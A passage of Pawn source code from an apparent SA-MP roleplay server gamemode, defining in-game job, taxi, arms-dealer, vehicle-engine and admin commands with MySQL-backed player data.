						CarieraObiect[playerid][16] = CreateDynamicObject(16305, 1934.16650, -1405.23657, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][17] = CreateDynamicObject(16305, 1932.66187, -1394.23938, 13.79690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][18] = CreateDynamicObject(16305, 1926.67236, -1422.79370, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][19] = CreateDynamicObject(16305, 1934.54395, -1416.69360, 14.18690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][20] = CreateDynamicObject(16305, 1932.69910, -1431.60596, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][21] = CreateDynamicObject(16305, 1941.48486, -1426.15491, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][22] = CreateDynamicObject(16305, 1944.30835, -1412.60999, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][23] = CreateDynamicObject(16305, 1943.26306, -1400.81042, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][24] = CreateDynamicObject(16305, 1951.56250, -1422.24072, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][25] = CreateDynamicObject(16305, 1950.59973, -1434.50659, 13.92690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						SetDynamicObjectMaterial(CarieraObiect[playerid][0], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][1], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][2], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][3], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][4], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][5], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][6], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][7], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][8], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][9], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][10], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][11], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][12], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][13], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][14], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][15], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][16], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][17], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][18], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][19], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][20], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][21], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][22], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][23], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][24], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						SetDynamicObjectMaterial(CarieraObiect[playerid][25], 0, 9931, "churchsfe", "gravelkb_128", 0xFFFFBD9D);
						
						CarieraObiecte[playerid] = 0;
						
						DisableRemoteVehicleCollisions(playerid, 1);
					}
				}
				else return SCM(playerid, -1, "You can not start the job if you're in a vehicle.");
			}
			else
			{
				SCM(playerid, -1, "You are not in the place where you can start your job.");
				if(PlayerInfo[playerid][pJob] == 5) SetPlayerCheckpoint(playerid, 2113.9395,-1776.6284,13.3911, 5.0);
				if(PlayerInfo[playerid][pJob] == 16) SetPlayerCheckpoint(playerid, 1104.6542,-1199.9751,17.8557, 5.0);
				if(PlayerInfo[playerid][pJob] == 17) SetPlayerCheckpoint(playerid, 850.1213,862.6287,13.3516, 5.0);
				if(PlayerInfo[playerid][pJob] == 18) SetPlayerCheckpoint(playerid, 1963.7090,-1363.5723,13.1260, 5.0);
				CP[playerid] = 600;
			}
        }
	}
	return 1;
}
CMD:pizza(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pJob] == 5)
		{
		    if(workdeja[playerid] == 1)
		    {
			    if(pizzatime[playerid] > 0)
			    {
			        new strr[256];
			        format(strr,sizeof(strr),"You can deliver another pizza in %d seconds.",pizzatime[playerid]);
			        SendClientMessage(playerid, COLOR_GREY, strr);
			        return 1;
				}
				if(GetPlayerState(playerid) == 2)
			    {
			        DisablePlayerRaceCheckpoint(playerid);
		            new rand,Float:Position[3],distance;
					rand = random(sizeof(gRandomPizza));
					GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
					SetPlayerRaceCheckpoint(playerid,0,gRandomPizza[rand][0],gRandomPizza[rand][1],gRandomPizza[rand][2],0.0,0.0,0.0,4.0);
					distance = floatround(GetDistanceBetweenPoints(Position[0],Position[1], Position[2], gRandomPizza[rand][0], gRandomPizza[rand][1], gRandomPizza[rand][2]), floatround_round);
					if(PlayerInfo[playerid][pPizzaSkill] == 1) pizzaprize[playerid] = distance*12;
					if(PlayerInfo[playerid][pPizzaSkill] == 2) pizzaprize[playerid] = distance*12 + (distance*12)*(10/100);
					if(PlayerInfo[playerid][pPizzaSkill] == 3) pizzaprize[playerid] = distance*12 + (distance*12)*(20/100);
					if(PlayerInfo[playerid][pPizzaSkill] == 4) pizzaprize[playerid] = distance*12 + (distance*12)*(30/100);
					if(PlayerInfo[playerid][pPizzaSkill] == 5) pizzaprize[playerid] = distance*12 + (distance*12)*(40/100);
					if(PlayerInfo[playerid][pPizzaSkill] == 6) pizzaprize[playerid] = distance*12 + (distance*12)*(50/100);
					pizzaj[playerid] = 1;
					pizzatime[playerid] = 30;
					failpizza[playerid] = -1;
					PizzaCP[playerid] = 1;
					SCM(playerid,COLOR_GREY,"Go to Checkpoint to deliver pizza.");
			    }
			    else return SCM(playerid,COLOR_SERVER,"You are not the driver of pizza scooter.");
			}
			else return SCM(playerid,COLOR_SERVER,"Type [/work] to get a pizza scooter.");
		}
		else return SCM(playerid,COLOR_SERVER,"You are not a Pizza Boy.");
	}
	return 1;
}
CMD:fare(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pMember] == 13)
		{
			new string[128],sendername[25];
			if(TransportDuty[playerid] > 0)
			{
			    if(TransportDuty[playerid] == 1)
			    {
			        TaxiDrivers -= 1;
			    }
			    TransportDuty[playerid] = 0;
				format(string, sizeof(string), "* You are now Off Duty and earned $%s.", FormatNumber(TransportMoney[playerid]));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, TransportMoney[playerid]);
				ConsumingMoney[playerid] = 1; TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
				return 1;
			}
			new moneys;
			if(sscanf(params, "d",moneys)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/fare <Amount of Money>");
			new Veh = GetPlayerVehicleID(playerid);
			if(Veh == taxic[1] || Veh == taxic[2] || Veh == taxic[3] || Veh == taxic[4] || Veh == taxic[5] || Veh == taxic[6] || Veh == taxic[7] || Veh == taxic[8] || Veh == taxic[9] || Veh == taxic[10] && PlayerInfo[playerid][pMember] == 13)
			{
			    if(GetPlayerState(playerid) == 2)
			    {
					if(moneys < 1 || moneys > 500) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Fare price must be between $1 and $500.");
				    TaxiDrivers += 1; TransportDuty[playerid] = 1; TransportValue[playerid] = moneys;
				    GetPlayerName(playerid,sendername,sizeof(sendername));
    				format(string, sizeof(string), "{00D900}* Taxi driver %s is now on duty($%s).[/service taxi]", sendername, FormatNumber(TransportValue[playerid]));
    				OOCNews2(TEAM_GROVE_COLOR,string);
				}
				else
				{
				    SendClientMessage(playerid, COLOR_SERVER, "You are not the driver.");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_SERVER, "You are not in a taxi.");
			}
		}
		else
		{
		    SendClientMessage(playerid,COLOR_SERVER, "You are not a taxi driver.");
		    return 1;
		}
    }
    return 1;
}
CMD:getmats(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pJob] != 9) return SendClientMessage(playerid,COLOR_SERVER,	"{FFB870}You are not an Arms Dealer.");
        if(IsPlayerInRangeOfPoint(playerid, 5, 597.5396,-1246.9562,18.2512))
		{
			if(GetPlayerCash(playerid) >= 500)
			{
		    	SetPlayerCheckpoint(playerid, 1713.1602,916.2577,10.8203, 10.0);
		    	SendClientMessage(playerid, COLOR_SERVER, "Go to the checkpoint to collect materials.");
		    	MatsHolding[playerid] = 1;
		    	CP[playerid] = 6901;
		    	GivePlayerCash(playerid,-500);
				Update(playerid, pCashx);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "Nu ai $500.");
		}
		else
		{
		    SendClientMessage(playerid, COLOR_SERVER, "{FEC3AC}Go to the checkpoint to collect materials.");
		    SetPlayerCheckpoint(playerid,597.5396,-1246.9562,18.2512, 10.0);
		    GotoMats[playerid] = 1;
		}
	}
	return 1;
}
CMD:sellmaterials(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pJob] != 9) return SendClientMessage(playerid,COLOR_SERVER,	"{FFB870}You are not an Arms Dealer.");
		new id,mats,string[128],sendername[25],giveplayer[25],price;
	    if(sscanf(params, "uii",id,mats,price)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/sellmaterials <Name/Playerid> <Materials> <Price>");
		if(price < 1 || price > 150000) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Price not lower then $1, or above $150,000.");
		if(playerid == id) return SCM(playerid,COLOR_SERVER,"{FFB870}You can not sell yourself materials.");
        if(id != INVALID_PLAYER_ID)
        {
			if(ProxDetectorS(5.0, playerid, id))
			{
			    if(mats < 1 || mats > 50000) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Wrong ammount(1-50000).");
			    if(mats > PlayerInfo[playerid][pMats]) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have so many materials to sell.");
				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				format(string, sizeof(string), "{B8FFDB}* You offerd %s, %d materials for %s$.",giveplayer,mats,FormatNumber(price));
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* %s offered you %d materials for %s$, (type /accept materials %d) to accept.",sendername,mats,FormatNumber(price),playerid);
				SendClientMessage(id, COLOR_SERVER, string);
				MatsOffer[id] = playerid;
				MatsPrice[id] = price;
				MatsAmmo[id] = mats;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}This player is not near you.");
        }
    }
    return 1;
}
CMD:sellgun(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    if (PlayerInfo[playerid][pJob] != 9) return SendClientMessage(playerid,COLOR_GREY,"{FFB870}You are not an Arms Dealer.");
		new x_weapon[10],weapon[MAX_PLAYERS],ammo[MAX_PLAYERS],price[MAX_PLAYERS],price2,id,giveplayer[25],sendername[25],string[128];
		if(sscanf(params, "us[10]d",id,x_weapon,price2))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/sellgun <Name/Playerid> <Gun Name> <Price>");
			SendClientMessage(playerid, COLOR_SERVER, "*** Sell Guns ***");
			SendClientMessage(playerid, COLOR_SERVER, "{B8DBFF}Weapons:{FFFFFF} SDPistol(100) Deagle(150)");
			SendClientMessage(playerid, COLOR_SERVER, "{B8DBFF}Weapons:{FFFFFF} MP5(200) Shotgun(300)");
			SendClientMessage(playerid, COLOR_SERVER, "{B8DBFF}Weapons:{FFFFFF} AK47(350) M4(400) Rifle(600)");
			return 1;
		}
		if(playerid == id) return SCM(playerid,COLOR_SERVER,"{FFB870}You can not sell yourself weapons.");
		if(PlayerInfo[id][pJailed] > 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This player is in jail.");
		if(id != INVALID_PLAYER_ID)
        {
			if(PlayerInfo[id][pGunLic] == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This player does not have arms license.");
			if(strcmp(x_weapon,"sdpistol",true) == 0)
			{
			    if(PlayerInfo[playerid][pMats] < 100) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}Not enough Materials for that Weapon.");
				weapon[playerid] = 23;
				price[playerid] = 100;
				ammo[playerid] = 100;
			}
			else if(strcmp(x_weapon,"deagle",true) == 0)
			{
			    if(PlayerInfo[playerid][pMats] < 150) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}Not enough Materials for that Weapon.");
			    weapon[playerid] = 24;
				price[playerid] = 150;
				ammo[playerid] = 100;
			}
			else if(strcmp(x_weapon,"mp5",true) == 0)
			{
			    if(PlayerInfo[playerid][pMats] < 200) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}Not enough Materials for that Weapon.");
			    weapon[playerid] = 29;
				price[playerid] = 200;
				ammo[playerid] = 150;
			}
			else if(strcmp(x_weapon,"shotgun",true) == 0)
			{
			    if(PlayerInfo[playerid][pMats] < 300) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}Not enough Materials for that Weapon.");
			    weapon[playerid] = 25;
				price[playerid] = 300;
				ammo[playerid] = 50;
			}
			else if(strcmp(x_weapon,"ak47",true) == 0)
			{
			    if(PlayerInfo[playerid][pMats] < 350) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}Not enough Materials for that Weapon.");
			    weapon[playerid] = 30;
				price[playerid] = 350;
				ammo[playerid] = 250;
			}
			else if(strcmp(x_weapon,"m4",true) == 0)
			{
			    if(PlayerInfo[playerid][pMats] < 400) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}Not enough Materials for that Weapon.");
				weapon[playerid] = 31;
				price[playerid] = 400;
				ammo[playerid] = 250;
			}
			else if(strcmp(x_weapon,"rifle",true) == 0)
			{
			    if(PlayerInfo[playerid][pMats] < 600) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}Not enough Materials for that Weapon.");
			    weapon[playerid] = 33;
				price[playerid] = 600;
				ammo[playerid] = 25;
			}
			else return SendClientMessage(playerid,COLOR_SERVER,"{B8DBFF}Invalid weapon name.");
			if(price2 < 1 || price2 > 100000) return SendClientMessage(playerid,COLOR_SERVER,"{B8DBFF}Price must be between $1 and $100000.");
			if (ProxDetectorS(5.0, playerid, id))
			{
                if(Spectate[id] == playerid) return SCM(playerid,COLOR_SERVER,"{C1F589}This player is not near you.");
                if(GetPlayerCash(id) < price2) return SCM(playerid,COLOR_SERVER,"{FFB870}This player don't have money needed.");
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				SellgunOffer[id] = playerid;
				SellgunPrice[id] = price2;
				SellgunMats[id] = price[playerid];
				SellgunAmmo[id] = ammo[playerid];
				SellgunID[id] = weapon[playerid];
				new gunname[50];
				GetWeaponNameEx(weapon[playerid],gunname,sizeof(gunname));
				format(string, sizeof(string), "{B8FFDB}* You offerd %s %s for %s$.",giveplayer,gunname,FormatNumber(price2));
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* %s offered you %s for %s$, (type /accept gun %d) to accept.",sendername,gunname,FormatNumber(price2),playerid);
				SendClientMessage(id, COLOR_SERVER, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}This player is not near you.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:matsinfo(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
	    if (PlayerInfo[playerid][pJob] != 9) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You are not an Arms Dealer.");
		new coordsstring1[256];
 		new mats = PlayerInfo[playerid][pMats];
		format(coordsstring1, sizeof(coordsstring1), "Materials: [%d]", mats);
        ShowPlayerDialog(playerid, DIALOG_MATSINSO, DIALOG_STYLE_MSGBOX, "Materials Information:", coordsstring1, "Close","");
	}
    return 1;
}
CMD:engine(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
        new idcar = GetPlayerVehicleID(playerid),string[128],sendername[25];
        new engine,lights,alarm,doors,bonnet,boot,objective;
        if(Gas[idcar] == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}This car don't have fuel.");
	    if(IsABike(idcar)) return SendClientMessage(playerid,COLOR_SERVER,"{999999}Command can not be used on bike.");
	    if(Refueling[playerid] == 0)
  	 	{
     	    if(vehEngine[idcar] == 0)
        	{
				vehEngine[idcar] = 1;
	            GetVehicleParamsEx(idcar,engine,lights,alarm,doors,bonnet,boot,objective);
	            SetVehicleParamsEx(idcar,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
	            new vehicle;
	            vehicle = GetVehicleModel(idcar) - 400;
	    		GetPlayerName(playerid, sendername, sizeof(sendername));
	            SetPVarInt(playerid, "Engine", 1);
	            if(Undercover[playerid] != 0)
	            {
	                format(string,sizeof(string),"* An unknown hitman starts the engine of his %s.",aVehicleNames[vehicle]);
		            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	            }
	            else
	            {
		            format(string,sizeof(string),"* %s starts the engine of his %s.",sendername,aVehicleNames[vehicle]);
		            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
        	}
      	  	else if(vehEngine[idcar] == 1)
        	{
    			vehEngine[idcar] = 0;
    			GetVehicleParamsEx(idcar,engine,lights,alarm,doors,bonnet,boot,objective);
      	    	SetVehicleParamsEx(idcar,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
            	new vehicle;
            	vehicle = GetVehicleModel(idcar) - 400;
	        	GetPlayerName(playerid, sendername, sizeof(sendername));
            	SetPVarInt(playerid, "Engine", 0);
            	if(Undercover[playerid] != 0)
            	{
	                format(string,sizeof(string),"* An unknown hitman stops the engine of his %s.",aVehicleNames[vehicle]);
	            	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            	}
            	else
            	{
	            	format(string,sizeof(string),"* %s stops the engine of his %s.",sendername,aVehicleNames[vehicle]);
	            	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
        	}
    	}
		else return SendClientMessage(playerid,COLOR_SERVER,"{999999}Please wait, you refill your vehicle.");
    }
	else return SendClientMessage(playerid,COLOR_SERVER,"{999999}You need to be in a vehicle to use this command.");
	return 1;
}
CMD:disarm(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new id,string[128],sendername[25],giveplayer[25];
		if(sscanf(params, "u",id)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/disarm <Name/Playerid>");
		if(id != INVALID_PLAYER_ID)
		{
		    GetPlayerName(id, giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
		    ResetPlayerWeaponsEx(id);
		    ResetPlayerWeapons(id);
			format(string, sizeof(string), "{ba9789}Warning: %s disarmed %s.",sendername, giveplayer);
			ABroadCast(COLOR_SERVER,string,1);
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{C1F589}Error: Player not connected.");
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:givemats(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
	    if (PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid,COLOR_ERROR, AdminOnly);
	    new id,mats,giveplayer[25],sendername[25],string[128];
		if(sscanf(params, "ud",id,mats)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/givemats <Name/Playerid> <Materials>");
	    if(id != INVALID_PLAYER_ID)
	    {
            PlayerInfo[id][pMats] += mats;
         	GetPlayerName(id, giveplayer, sizeof(giveplayer));
         	GetPlayerName(playerid, sendername, sizeof(sendername));
         	format(string, sizeof(string), "{ba9789}Warning: %s give %s %d materials.",sendername, giveplayer,mats);
		 	ABroadCast(COLOR_SERVER,string,5);
			new str[128];
			mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Materials`='%d' WHERE `name`='%s'",PlayerInfo[id][pMats],PlayerInfo[id][pNormalName]);
			mysql_tquery(SQL,str,"","");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:agl(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if (PlayerInfo[playerid][pAdmin] >= 4)
        {
			new id,x_nr[10],sendername[25],giveplayer[25],string[128];
			if(sscanf(params, "us[10]",id,x_nr))
			{
				SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/agl <Name/Playerid> <License>");
			    SendClientMessage(playerid, COLOR_SERVER, "Available names: Driving, Pilots, Sailing, Weapon.");
				return 1;
			}
			if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			GetPlayerName(playerid, sendername, sizeof(sendername));
		    GetPlayerName(id, giveplayer, sizeof(giveplayer));
		    if(strcmp(x_nr,"driving",true) == 0)
			{
	            format(string, sizeof(string), "* You've given a Drivers License to %s.",giveplayer);
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		        format(string, sizeof(string), "* Admin %s has given you a Drivers License.",sendername);
		        SendClientMessage(id, COLOR_LIGHTBLUE, string);
		        PlayerInfo[id][pCarLic] = 1;
		        PlayerInfo[id][pCarLicT] = 100;
				PlayerInfo[id][pCarLicSuspend] = 0;
				Update(id, pCarLicSuspendx);
				new str[128];
				mysql_format(SQL,str,128,"UPDATE users SET `CarLic`='1',`CarLicT`='100' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str,"","");
		        return 1;
			}
			else if(strcmp(x_nr,"pilots",true) == 0)
			{
	            format(string, sizeof(string), "* You've given a Pilots License to %s.",giveplayer);
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		        format(string, sizeof(string), "* Admin %s has given you a Pilots License.",sendername);
		        SendClientMessage(id, COLOR_LIGHTBLUE, string);
		        PlayerInfo[id][pFlyLic] = 1;
		        PlayerInfo[id][pFlyLicT] = 100;
				new str[128];
				mysql_format(SQL,str,128,"UPDATE users SET `FlyLic`='1',`FlyLicT`='100' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str,"","");
		        return 1;
			}
			else if(strcmp(x_nr,"sailing",true) == 0)
			{
	            format(string, sizeof(string), "* You've given a Sailing License to %s.",giveplayer);
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		        format(string, sizeof(string), "* Admin %s has given you a Sailing License.",sendername);
		        SendClientMessage(id, COLOR_LIGHTBLUE, string);
		        PlayerInfo[id][pBoatLic] = 1;
		        PlayerInfo[id][pBoatLicT] = 100;
				new str[128];
				mysql_format(SQL,str,128,"UPDATE users SET `BoatLic`='1',`BoatLicT`='100' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str,"","");
		        return 1;
			}
			else if(strcmp(x_nr,"weapon",true) == 0)
			{
	            format(string, sizeof(string), "* You've given a Weapon License to %s.",giveplayer);
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		        format(string, sizeof(string), "* Admin %s has given you a Weapon License.",sendername);
		        SendClientMessage(id, COLOR_LIGHTBLUE, string);
		        PlayerInfo[id][pGunLic] = 1;
		        PlayerInfo[id][pGunLicT] = 100;
				PlayerInfo[id][pGunLicSuspend] = 0;
				Update(id, pGunLicSuspendx);
				new str[128];
				mysql_format(SQL,str,128,"UPDATE users SET `GunLic`='1',`GunLicT`='100' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str,"","");
		        return 1;
			}
        }
        else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
    }
    return 1;
}
CMD:carcolortemp(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(PlayerInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	new color1,color2;
	if(sscanf(params, "ii",color1,color2)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/carcolortemp <Color 1> <Color 2>");
    if(color1 < 0 || color1 > 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Wrong color id.");
    if(color2 < 0 || color2 > 255) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Wrong color id.");
    new vehid = GetPlayerVehicleID(playerid);
    if(IsPlayerInVehicle(playerid, vehid))
    {
        ChangeVehicleColor(vehid, color1, color2);
		return 1;
    }
    else
    {
		SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not in car.");
	}
    return 1;
}
CMD:anno(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
		new text[250],string[250],sendername[25];
		if(sscanf(params, "s[250]",text)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/anno <Message>");
		GetPlayerName(playerid,sendername,sizeof(sendername));
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			format(string, sizeof(string), "(( %s: %s ))", sendername, text);
			OOCOff(COLOR_GENANNOUNCE2,string);
		}
		printf("%s", string);
	}
	return 1;
}
CMD:o(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_BLUE, "You need to login first.");
    if(PlayerInfo[playerid][pAdmin] >= 1)
    {
		new text[250],string[250],sendername[25];
		if(sscanf(params, "s[250]",text)) return SendClientMessage(playerid, COLOR_WHITE, "{00FF00}Usage:{FFFFFF} /o [message]");
		GetPlayerName(playerid,sendername,sizeof(sendername));
		if(PlayerInfo[playerid][pAdmin] >= 20)
		{
			format(string, sizeof(string), "(( Anunt: Server-ul va fi restartat motiv: %s ))", text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
	    if(PlayerInfo[playerid][pAdmin] == 14)
		{
			format(string, sizeof(string), "(( Founder %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
	    if(PlayerInfo[playerid][pAdmin] == 13)
		{
			format(string, sizeof(string), "(( Script Developer %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
